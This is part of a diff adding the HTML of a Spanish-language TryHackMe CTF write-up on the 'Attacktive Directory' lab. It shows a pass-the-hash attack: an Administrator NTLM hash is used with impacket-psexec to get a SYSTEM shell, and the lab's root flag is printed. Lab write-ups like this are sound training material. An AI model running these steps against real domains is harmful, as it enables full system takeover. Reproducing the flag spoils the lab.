+SMB         10.10.161.28    445    ATTACKTIVEDIREC  <span class="o">[</span>+] spookysec.local<span class="se">\A</span>dministrator:0e0363213e37b94221497260b0bcb4fc <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Nos conectamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-psexec WORKGROUP/Administrator@10.10.161.28 <span class="nt">-hashes</span> :0e0363213e37b94221497260b0bcb4fc
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.161.28.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file OhcqNVZU.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.161.28.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service Sram on 10.10.161.28.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service Sram.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.1490]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+The system cannot find the file specified.
+Error occurred <span class="k">while </span>processing: type.
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+
+
+TryHackMe<span class="o">{</span>4ctiveD1rectoryM4st3r<span class="o">}</span>
+C:<span class="se">\U</span>sers&gt;
+</code></pre></div></div>
+
+
+  </div><a class="u-url" href="/tryhackme/machines/medium/2024/12/27/ad.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_miguelitornuno7" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
